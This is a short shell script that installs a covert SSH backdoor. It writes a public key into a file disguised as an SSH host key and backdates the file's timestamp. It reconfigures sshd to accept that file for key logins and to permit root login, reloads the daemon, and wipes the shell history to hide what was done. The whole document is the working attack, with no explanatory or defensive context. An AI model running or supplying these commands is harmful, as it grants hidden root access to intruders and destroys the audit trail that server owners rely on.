echo "PUBKEY HERE" >> /etc/ssh/ssh_host_rsa2048_key.pub
touch -r /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa2048_key.pub
sed -i 's/\#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
kill -HUP $(pgrep -f `which sshd`)
history -c
echo "" > ~/.bash_history
